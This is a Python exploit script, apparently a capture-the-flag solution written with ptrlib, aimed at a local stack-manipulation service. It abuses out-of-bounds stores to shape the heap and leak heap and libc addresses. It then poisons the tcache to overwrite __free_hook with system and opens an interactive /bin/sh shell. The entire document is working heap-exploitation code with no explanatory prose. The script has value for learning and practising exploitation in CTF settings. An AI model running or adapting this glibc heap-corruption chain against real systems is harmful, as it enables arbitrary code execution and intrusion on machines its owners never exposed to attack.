from ptrlib import *

def push(v):
    sock.sendlineafter(">> ", "1")
    if v >> 31:
        sock.sendlineafter(": ", str(-((v ^ 0xffffffff) + 1)))
    else:
        sock.sendlineafter(": ", str(v))
def pop():
    sock.sendlineafter(">> ", "2")
def store(i, v):
    sock.sendlineafter(">> ", "3")
    sock.sendlineafter(": ", str(i))
    if v >> 31:
        sock.sendlineafter(": ", str(-((v ^ 0xffffffff) + 1)))
    else:
        sock.sendlineafter(": ", str(v))
def load(i):
    sock.sendlineafter(">> ", "4")
    sock.sendlineafter(": ", str(i))
    return int(sock.recvlineafter(": "))
def wipe():
    sock.sendlineafter(">> ", "5")

libc = ELF("../distfiles/libc.so.6")
sock = Socket("localhost", 9001)

"""
Step 1)  heap feng shui
"""
# prepare unsorted bin
logger.info("Linking into unsorted bin")
for i in range(8):
    push(i)
store(-2, 0x91)
for i in range(8, 16):
    push(i)
store(10, 0x111)
store(11, 0)
addr_heap = (load(-9) << 32) + load(-10) - 0x10
logger.info("heap = " + hex(addr_heap))
for i in range(16, 32):
    push(i)
store(-2, 0x211)
for i in range(32, 64):
    push(i)
store(10, 0x411)
for i in range(64, 128):
    push(i)
for i in range(128, 256):
    push(i)
store(18, 0xf0a1) # top
store(19, 0)
for i in range(256, 512):
    push(i)
push(0xdead)
store(-2, 0x80)
wipe()

# corrupt link
logger.info("Corrupting tcache link")
for i in range(4):
    push(0xff0000 + i)
store(-2, 0x111)
for i in range(4, 8):
    push(0xff0000 + i)
store(-2, 0x51)
for i in range(8, 32):
    push(0xff0000 + i)
for i in range(32, 58):
    push(0xff0000 + i)
push(0x51)
push(0)
addr_target = addr_heap + 0x120f0
push(addr_target & 0xffffffff)
push(addr_target >> 32)
store(6, 0x21)
store(7, 0)
store(8, 0)
store(9, 0)
wipe()

"""
Step 2) Libc leak
"""
# consume
logger.info("Consuming chunk for 0x50")
for i in range(16):
    push(i)
store(-2, 0x31)
push(0xcafe)
wipe()
for i in range(16):
    push(i)
# leak
libc_base = (load(-5) << 32) + load(-6) - libc.main_arena() - 0x60
logger.info("libc = " + hex(libc_base))

"""
Step 3) Poison tcache
"""
addr_victim = libc_base + libc.symbol("__free_hook")
store(-2, 0x81)
for i in range(16, 33):
    push(i)
store(6, 0x21)
store(7, 0)
store(8, addr_victim & 0xffffffff)
store(9, addr_victim >> 32)
wipe()

"""
Step 4) Win!
"""
addr_target = libc_base + libc.symbol("system")
push(addr_target & 0xffffffff)
push(addr_target >> 32)
push(0xdead)
push(0xbeef)
store(0, u32("/bin"))
store(1, u32("/sh\0"))
push(0xcafe)

sock.interactive()
